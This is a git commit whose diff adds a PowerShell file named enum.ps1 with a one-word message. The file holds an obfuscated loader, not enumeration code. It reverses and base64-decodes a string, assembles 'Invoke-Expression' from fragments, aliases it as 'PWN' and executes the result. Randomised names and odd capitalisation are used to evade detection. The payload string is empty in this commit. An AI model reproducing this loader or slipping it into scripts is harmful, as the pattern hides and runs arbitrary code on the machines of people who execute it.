40edff5b85c048d6900a5ff5a8e5e6e92d073031
Xyspi <devpyro@protonmail.ch>
2025-02-03 10:38:02 -0500

    ya

---
+++ enum.ps1
@@ -0,0 +1,5 @@
+$uDAgK0dab4Y1f5z = "" ;
+$diPr5I7Xl3a8tfqFK = $uDAgK0dab4Y1f5z.ToCharArray() ; [array]::Reverse($diPr5I7Xl3a8tfqFK) ; -join $diPr5I7Xl3a8tfqFK 2>&1> $null ;
+$s7u = [SysTEM.Text.EncOding]::uTF8.gETSTRiNg([sYSTEm.ConVErT]::fROMBase64StRING("$diPr5I7Xl3a8tfqFK")) ;
+$atP = "INV"+"OKe"+"-EX"+"pre"+"sSI"+"On" ; NeW-alIAs -naME PWN -VAlUE $atP -FOrCe ; pwN $s7u ;
+
